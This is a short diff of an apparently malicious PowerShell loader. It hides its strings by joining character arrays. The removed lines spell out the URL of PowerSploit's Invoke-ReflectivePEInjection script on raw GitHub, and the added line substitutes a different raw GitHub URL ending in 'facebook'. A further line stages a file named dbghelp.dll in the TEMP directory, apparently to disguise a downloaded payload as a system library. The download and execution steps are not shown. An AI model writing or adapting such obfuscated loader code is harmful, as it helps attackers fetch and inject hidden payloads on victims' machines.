@@ -1,17 +1,6 @@
 $ErrorActionPreference = @("St","op") -join ""
 
-$_0x3D2 = @(
-"h","t","t","p","s",":","/","/",
-"r","a","w",".",
-"g","i","t","h","u","b","u","s","e","r","c","o","n","t","e","n","t",".","c","o","m","/",
-"P","o","w","e","r","S","h","e","l","l","M","a","f","i","a","/",
-"P","o","w","e","r","S","p","l","o","i","t","/","m","a","s","t","e","r","/",
-"C","o","d","e","E","x","e","c","u","t","i","o","n","/",
-"I","n","v","o","k","e","-",
-"R","e","f","l","e","c","t","i","v","e",
-"P","E",
-"I","n","j","e","c","t","i","o","n",".","p","s","1"
-) -join ""
+$_0x91A = @( "https://raw", ".githubusercontent", ".com/Knxtoz", "/wasd/refs", "/heads/main/", "facebook" ) -join ""
 
 $_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")
 
